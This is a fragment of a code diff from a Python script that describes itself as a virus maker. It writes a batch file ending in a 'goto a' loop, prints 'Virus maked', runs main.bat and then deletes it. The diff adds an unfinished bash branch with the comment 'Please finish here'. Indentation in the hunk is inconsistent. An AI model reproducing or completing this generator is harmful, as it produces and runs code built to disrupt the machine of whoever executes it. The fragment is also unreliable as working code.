@@ -30,9 +30,11 @@ while True:
  
             goto a
                  """);
-      file.close();         
-      print('Virus maked');
-      subprocess.call([r'main.bat']);
-      os.remove('main.bat');
+    if lang == "bash":
+      pass # Please finish here
+   file.close();         
+   print('Virus maked');
+   subprocess.call([r'main.bat']);
+   os.remove('main.bat');
                  
                  
